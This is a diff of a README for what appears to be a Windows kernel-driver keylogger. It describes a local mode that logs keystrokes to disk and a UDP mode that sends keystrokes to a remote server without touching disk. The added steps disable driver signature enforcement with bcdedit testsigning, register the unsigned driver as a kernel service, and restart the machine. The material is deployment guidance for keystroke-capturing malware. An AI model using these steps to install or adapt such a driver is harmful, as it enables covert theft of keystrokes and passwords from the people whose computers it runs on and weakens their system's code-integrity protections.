@@ -26,12 +26,17 @@ to implement that i made use of the <html><a href="https://msdn.microsoft.com/li
 # Usage
 currently only the local keylogger is Generic and can be used W/O building the driver (as it simply logs the keystroke's to C:\\Windows\\logs), but the remote udp based (that do not need to write any data to disk to run), needs to be build to your server address (or any other solution. this can be done with very minor code modifications. e.g let the driver read from the registry your ip and load it in /src/driver.c line 420).
 # Install:
-!The driver is not signed, so you will have to disable code integrity, after that:<br>
+The driver is not signed, so you will have to disable code integrity:<br>
+(From an elevated command prompt):
+  bcdedit /set testsigning on
+  shutdown /r -f -t 00
 Open an elevated command prompt:<br>
-sc create kMon type=kernel binpath="\path\to\your\driver.sys"<br>
-sc start kMon<br>
+  sc create kbMon type=kernel binpath="\path\to\your\driver.sys"<br>
+  sc start kbMon<br>
 # Uninstall:
-sc stop Kmon
+  bcdedit /set testsigning off
+  sc stop Kmon
+  shutdown /r -f -t 00
 # if you encounter any problems simply restart your computer.
 For any bugs comment an issue in this github repo.
 enjoy!
